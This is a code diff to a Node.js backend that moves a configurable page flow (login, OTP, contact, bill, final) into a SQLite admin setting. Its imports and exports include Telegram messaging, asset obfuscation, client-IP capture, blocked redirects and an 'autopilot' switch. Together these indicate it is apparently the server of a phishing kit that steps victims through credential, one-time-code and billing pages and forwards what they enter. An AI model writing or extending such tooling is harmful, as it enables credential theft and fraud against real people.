@@ -1,5 +1,8 @@
 import path from "path";
 import fs from "fs/promises";
+import sqlite3 from "sqlite3";
+import { open } from "sqlite";
+import { initDB } from "./db.js";
 import axios from "axios";
 import { sendMessageFor } from "simple-telegram-message";
 import dotenv from "dotenv";
@@ -7,6 +10,8 @@ import JavaScriptObfuscator from "javascript-obfuscator";
 import { obfuscateMultiple } from "./obfuscate.js";
 import express from "express";
 import session from "express-session";
+
+const db = await initDB();
 
 function getClientIP(socket) {
   let ip = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
@@ -94,15 +99,53 @@ async function buildUserInfo(req, sendAPIRequest) {
   }
 }
 
-// ✅ Adjustable flow configuration
-// Page flow using numeric keys (order matters)
-const pageFlow = {
-  1: "login",
-  2: "otp",
-  3: "contact",        // skipped
-  4: "bill",
-  5: "final"
-};
+/**
+ * Fetches the pageFlow configuration from the database.
+ * If reading fails or the value is empty/invalid, returns the default pageFlow.
+ * @param {object} db - SQLite database instance
+ * @param {number} [id=1] - The ID of the admin_settings row
+ * @returns {Promise<object>}
+ */
+async function getPageFlow(db, id = 1) {
+  const DEFAULT_PAGEFLOW = {
+    "1": "login",
+    "2": "otp",
+    "3": "0",
+    "4": "bill",
+    "5": "final"
+  };
+
+  try {
+    const row = await db.get(`SELECT pageFlow FROM admin_settings WHERE id = ?`, [id]);
+
+    if (!row || !row.pageFlow) return DEFAULT_PAGEFLOW;
+
+    return JSON.parse(row.pageFlow);
+  } catch (err) {
+    console.error("Failed to read pageFlow:", err);
+    return DEFAULT_PAGEFLOW;
+  }
+}
+
+let pageFlow = await getPageFlow(db);
+
+
+async function savePageFlow(db, pageFlow, id = 1) {
+  try {
+    const jsonString = JSON.stringify(pageFlow);
+
+    await db.run(
+      `UPDATE admin_settings SET pageFlow = ? WHERE id = ?`,
+      [jsonString, id]
+    );
+
+    return true;
+  } catch (err) {
+    console.error("Failed to save pageFlow:", err);
+    return false;
+  }
+}
+
 
 // Backend → frontend mapping
 const routeMap = {
@@ -255,4 +298,4 @@ async function isAutopilotOn(db) {
   return row?.autopilot === 1;
 }
 
-export { buildMessage, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, sendAPIRequest, pageFlow, requireAdmin, blockedRedirect, resolveFrontendRoute, prepareObfuscatedAssets, routeMap };
+export { buildMessage, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, sendAPIRequest, getPageFlow, savePageFlow, pageFlow, requireAdmin, blockedRedirect, resolveFrontendRoute, prepareObfuscatedAssets, routeMap };
